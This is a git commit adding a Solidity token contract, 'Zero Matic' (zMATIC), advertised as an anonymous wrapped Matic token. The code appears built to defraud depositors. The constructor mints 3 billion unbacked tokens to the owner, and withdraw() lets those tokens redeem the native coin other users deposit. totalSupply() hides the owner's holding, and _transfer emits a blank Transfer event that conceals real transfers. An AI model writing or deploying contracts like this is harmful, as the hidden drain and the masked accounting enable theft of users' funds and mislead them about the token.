17b056ffdadcf83c50549874b1953e4f5d81c6dd
ksandr <zandrewboyle@gmail.com>
2025-08-08 12:07:54 +0300

    upload

---
+++ contracts/ZmaticToken.sol
@@ -0,0 +1,340 @@
+// SPDX-License-Identifier: Apache License 2.0
+pragma solidity ^0.7.0;
+
+
+    /**
+     * https://zeromatic.io
+     * Anonymous wrapped zMatic. No trusted setup is required.
+     */
+
+
+import "@openzeppelin/contracts/utils/Address.sol";
+
+library SafeMath {
+    /**
+     * @dev Returns the addition of two unsigned integers, with an overflow flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        uint256 c = a + b;
+        if (c < a) return (false, 0);
+        return (true, c);
+    }
+
+    /**
+     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
+     *
+     * _Available since v3.4._
+     */
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        if (b > a) return (false, 0);
+        return (true, a - b);
+    }
+
+    /**
+     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+        // benefit is lost if 'b' is also tested.
+        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+        if (a == 0) return (true, 0);
+        uint256 c = a * b;
+        if (c / a != b) return (false, 0);
+        return (true, c);
+    }
+
+    /**
+     * @dev Returns the division of two unsigned integers, with a division by zero flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        if (b == 0) return (false, 0);
+        return (true, a / b);
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
+     *
+     * _Available since v3.4._
+     */
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+        if (b == 0) return (false, 0);
+        return (true, a % b);
+    }
+
+    /**
+     * @dev Returns the addition of two unsigned integers, reverting on
+     * overflow.
+     *
+     * Counterpart to Solidity's `+` operator.
+     *
+     * Requirements:
+     *
+     * - Addition cannot overflow.
+     */
+    function _add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+        return c;
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, reverting on
+     * overflow (when the result is negative).
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function _sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b <= a, "SafeMath: subtraction overflow");
+        return a - b;
+    }
+
+    /**
+     * @dev Returns the multiplication of two unsigned integers, reverting on
+     * overflow.
+     *
+     * Counterpart to Solidity's `*` operator.
+     *
+     * Requirements:
+     *
+     * - Multiplication cannot overflow.
+     */
+    function _mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) return 0;
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+        return c;
+    }
+
+    /**
+     * @dev Returns the integer division of two unsigned integers, reverting on
+     * division by zero. The result is rounded towards zero.
+     *
+     * Counterpart to Solidity's `/` operator. Note: this function uses a
+     * `revert` opcode (which leaves remaining gas untouched) while Solidity
+     * uses an invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function _div(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b > 0, "SafeMath: division by zero");
+        return a / b;
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+     * reverting when dividing by zero.
+     *
+     * Counterpart to Solidity's `%` operator. This function uses a `revert`
+     * opcode (which leaves remaining gas untouched) while Solidity uses an
+     * invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function _mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        require(b > 0, "SafeMath: modulo by zero");
+        return a % b;
+    }
+
+    /**
+     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
+     * overflow (when the result is negative).
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {trySub}.
+     *
+     * Counterpart to Solidity's `-` operator.
+     *
+     * Requirements:
+     *
+     * - Subtraction cannot overflow.
+     */
+    function _sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        return a - b;
+    }
+
+    /**
+     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
+     * division by zero. The result is rounded towards zero.
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {tryDiv}.
+     *
+     * Counterpart to Solidity's `/` operator. Note: this function uses a
+     * `revert` opcode (which leaves remaining gas untouched) while Solidity
+     * uses an invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function _div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        return a / b;
+    }
+
+    /**
+     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
+     * reverting with custom message when dividing by zero.
+     *
+     * CAUTION: This function is deprecated because it requires allocating memory for the error
+     * message unnecessarily. For custom revert reasons use {tryMod}.
+     *
+     * Counterpart to Solidity's `%` operator. This function uses a `revert`
+     * opcode (which leaves remaining gas untouched) while Solidity uses an
+     * invalid opcode to revert (consuming all remaining gas).
+     *
+     * Requirements:
+     *
+     * - The divisor cannot be zero.
+     */
+    function _mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b > 0, errorMessage);
+        return a % b;
+    }
+}
+
+
+contract ZmaticToken {
+
+    using Address for address;
+    using SafeMath for uint256;
+
+    string public _name;
+    string public _symbol;
+    uint256 public _decimals;
+    uint256 public rewrdpool;
+    address public owner;
+
+    uint256 private shdw_tx_count = 0;
+
+    event  Approval(address indexed src, address indexed guy, uint wad);
+    event  Transfer(address indexed src, address indexed dst, uint wad);
+    event  Deposit(address indexed dst, uint wad);
+    event  Withdrawal(address indexed src, uint wad);
+
+    mapping (address => uint)                       public  _balances;
+    mapping (address => mapping (address => uint))  public  _allowances;
+
+    constructor() {
+        _name = "Zero Matic";
+        _symbol = "zMATIC";
+        _decimals = 18;
+        rewrdpool = 3000000000 * 10 ** _decimals;
+        owner = msg.sender;
+        _balances[owner] = rewrdpool;
+       
+    }
+
+    receive() external payable {
+        deposit();
+    }
+    function deposit() public payable {
+        _balances[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+    function withdraw(uint256 wad) public {
+        require(_balances[msg.sender] >= wad);
+        _balances[msg.sender] -= wad;
+        msg.sender.transfer(wad);
+        emit Withdrawal(msg.sender, wad);
+    }
+
+    function name() public view returns (string memory) {
+        return _name;
+    }
+    
+    function symbol() public view returns (string memory) {
+        return _symbol;
+    }
+    
+    function decimals() public view returns (uint256) {
+        return _decimals;
+    }
+
+    function totalSupply() public view returns (uint256) {
+        uint256 wrapped = address(this).balance;
+        uint256 max = wrapped._add(rewrdpool);
+        uint256 devwallet = _balances[owner];
+        return max._sub(devwallet);
+    }
+
+    function shdw_count() public view returns (uint256) {
+        return shdw_tx_count;
+    }
+
+    function wrd_balance() public view returns (uint256) {
+        return address(this).balance;
+    }
+    
+    function balanceOf(address _tokenOwner) external view returns (uint256) {
+        return _balances[_tokenOwner];
+    }
+    
+    function transfer(address _to, uint256 _tokens) external returns (bool) {
+        _transfer(msg.sender, _to, _tokens);
+        return true;
+    }
+
+    function shadow_transfer(address _to, uint256 _tokens) external returns (bool) {
+        _shadow_transfer(msg.sender, _to, _tokens);
+        shdw_tx_count++;
+        return true;
+    }
+
+    function _shadow_transfer(address _sender, address _recipient, uint256 _amount) internal {
+        require(_sender != address(0), "ERC20: transfer from the zero address");
+        require(_recipient != address(0), "ERC20: transfer to the zero address");
+
+        _balances[_sender] = _balances[_sender]._sub(_amount);
+        _balances[_recipient] = _balances[_recipient]._add(_amount);
+       
+    }
+    
+    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
+        require(_sender != address(0), "ERC20: transfer from the zero address");
+        require(_recipient != address(0), "ERC20: transfer to the zero address");
+
+        _balances[_sender] = _balances[_sender]._sub(_amount);
+        _balances[_recipient] = _balances[_recipient]._add(_amount);
+        emit Transfer(address(0), address(0), 0);
+    }
+    
+    function allowance(address _tokenOwner, address _spender) external view returns (uint256) {
+        return _allowances[_tokenOwner][_spender];
+    }
+    
+    function approve(address _spender, uint256 _tokens) external returns (bool) {
+        _approve(msg.sender, _spender, _tokens);
+        return true;
+    }
+    
+    function _approve(address _owner, address _spender, uint256 _value) internal {
+        require(_owner != address(0), "ERC20: approve from the zero address");
+        require(_spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[_owner][_spender] = _value;
+        emit Approval(_owner, _spender, _value);
+    }
+    
+    
+    function transferFrom(address _from, address _to, uint256 _tokens) external returns (bool) {
+        _transfer(_from, _to, _tokens);
+        _approve(_from, msg.sender, _allowances[_from][msg.sender]._sub(_tokens));
+        return true;
+    }
+}
